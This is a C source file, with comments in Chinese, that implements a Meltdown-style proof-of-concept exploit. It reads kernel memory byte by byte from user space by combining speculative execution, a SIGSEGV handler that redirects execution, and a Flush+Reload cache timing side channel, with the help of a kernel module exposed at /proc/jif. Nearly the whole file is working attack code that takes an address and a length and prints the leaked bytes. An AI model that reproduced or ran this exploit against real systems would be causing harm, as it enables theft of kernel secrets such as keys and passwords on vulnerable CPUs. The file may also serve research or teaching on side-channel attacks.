#include <stdio.h>
#include <stdlib.h>
#include <malloc.h>
#include <string.h>
#include <errno.h>
#include <x86intrin.h>

#include <fcntl.h>
#include <unistd.h>
#include <signal.h>
#include <ucontext.h>
#include <ctype.h>

#define PAGE_SIZE (1024*4)
#define BUF_SIZE (PAGE_SIZE*256) //4K * 256
#define BYTE_SIZE 256
#define CYCLES 1000   		  //
#define CLFLUSH_STEP_LEN 16   //清理数据缓存的步长(严重影响成功率)
#define LKM_NAME "/proc/jif"  //kernelValue2cache内核模块创建的文件

char target_buf[BUF_SIZE];//
extern char stopspeculate[];

void exposeValue(void* addr);//利用乱序执行，将addr指向的1字节的值左移动12(addr 指向的值 * PAGE_SIZE)，
							 //用来访问target_buf(将target_buf对应的块加载进缓存,然后通过测试target_buf对应块的访问速度，获得addr指向的值)
							 
void clflushTargetBuf();//清理缓存中的target_buf
inline int get_access_time(volatile char *addr);//获取数据的访问时间
void initEnv();//进行初始化工作(构造函数)
int getByte(void *addr);//通过测试target_buf每块（每块一个页面）的访问时间，获得对应addr指向的值
void loadValue2Cache(void *addr);//将内核数据加载进缓存

int fd;

char *start_addr;
int len;

int main(int argc,char *argv[]){
	initEnv();
	
	if(argc != 3){
		printf("usage: %s addr size\n",argv[0]);
		exit(-1);
	}

	if(sscanf(argv[1],"%p",&start_addr) != 1){
		printf("invalid addr\n");
		exit(-1);
	}

	if(sscanf(argv[2],"%d",&len) != 1){
		printf("invalid len\n");
		exit(-1);
	}
	
	char *addr;
	addr = start_addr;
	
	for(int i = 0;i<len;i++){
		write(fd,&addr,sizeof(addr));
		int c = getByte(addr);
		printf("%p %c %d\n",addr,c,c);
		addr += 1;
	}

	return 0;
}

void loadValue2Cache(void *addr){
	char buf[256] = {0};
	read(fd,buf,256);
}

int getByte(void *addr){
	int hist[256] = {0};//直方图
	
	for(int j = 0;j<CYCLES;j++){
		int min = 99999;
		int idx = 0;
		int arr[256] = {0};
		
		clflushTargetBuf();
		
		loadValue2Cache(addr);	
		exposeValue(addr);

		for(int i = 0;i<256;i++){
			arr[i] = get_access_time(&target_buf[i<<12]);
			if( arr[i] < min ){
				min = arr[i];
				idx = i;
			}
		}
		hist[idx]++;
	}
	
	int max = 0;
	int idx = 0;
	for(int i = 0;i<256;i++){
		if(max<hist[i]){
			idx = i;
			max = hist[i];
		}
	}
	return idx;
}

void sigsegv(int sig,siginfo_t *siginfo,void *context){
	ucontext_t *ucontext = (ucontext_t*)context;
	ucontext->uc_mcontext.gregs[REG_RIP] = (unsigned long)stopspeculate;
}

void initEnv(){
	if((fd=open(LKM_NAME,O_RDWR)) == -1){
		printf("open %s error:%s\n",LKM_NAME,strerror(errno));
		exit(-1);
	}
	
	struct sigaction act = {0};
	act.sa_sigaction = sigsegv;
	act.sa_flags = SA_SIGINFO;

	if(sigaction(SIGSEGV,&act,NULL) == -1){
		printf("init sig error:%s\n",strerror(errno));
		exit(-1);
	}
}

void exposeValue(void *addr){
	asm volatile (
		"lea %[target], %%rbx\n\t"
		"1:\n\t"

		".rept 300\n\t"
		"add $0x141, %%rax\n\t"
		".endr\n\t"

		"movzx (%[addr]), %%eax\n\t"
		"shl $12, %%rax\n\t"
		"movzx (%%rbx, %%rax, 1), %%rbx\n"

		"stopspeculate: \n\t"
		"nop\n\t"
		:
		: [target] "m" (target_buf),
		  [addr] "r" (addr)
		: "rax", "rbx"
	);
}

void clflushTargetBuf(){
	unsigned int i;
	for(i = 0;i<BUF_SIZE;i+=CLFLUSH_STEP_LEN){
		_mm_clflush( target_buf + i);
	}
}

int get_access_time(volatile char *addr){
	int time1,time2;
	unsigned int junk;
	volatile int j;

	time1 = __rdtscp(&junk);
	j = *addr;
	time2 = __rdtscp(&junk);

	return time2 - time1;
}
